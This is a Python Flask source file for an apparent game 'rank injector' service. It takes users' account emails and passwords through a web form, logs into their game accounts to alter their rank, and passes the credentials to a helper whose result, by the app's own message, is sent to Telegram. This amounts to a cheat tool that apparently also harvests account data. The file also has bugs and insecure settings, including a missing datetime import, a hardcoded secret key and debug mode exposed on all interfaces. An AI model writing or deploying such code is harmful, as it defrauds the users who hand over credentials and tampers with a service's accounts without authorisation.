# app.py
from flask import Flask, request, render_template, jsonify
from rankking import login, set_rank, check_clan_id
from helpers import log_attempt, check_network_access
import logging

app = Flask(__name__)
app.secret_key = 'cpm_rank_injector_session_key_2026'
logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/process', methods=['POST'])
def process():
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()
    
    if not email or not password:
        return jsonify({'status': 'error', 'message': 'Email and password are required'}), 400
    
    log_attempt(email)
    
    if not check_network_access():
        return jsonify({
            'status': 'error', 
            'message': 'Server network restriction. Admin must whitelist API domains.'
        }), 503
    
    token = login(email, password)
    if not token:
        return jsonify({'status': 'error', 'message': 'Invalid credentials or login failed'}), 401
    
    rank_success = set_rank(token)
    clan_id = check_clan_id(token, email, password)
    
    result_msg = 'Rank injected successfully. '
    if clan_id:
        result_msg += f'ClanId detected and sent to Telegram: {clan_id}'
    else:
        result_msg += 'No ClanId found for this account.'
        
    return jsonify({
        'status': 'success' if rank_success else 'warning',
        'message': result_msg
    })

@app.route('/health')
def health():
    return jsonify({'status': 'online', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)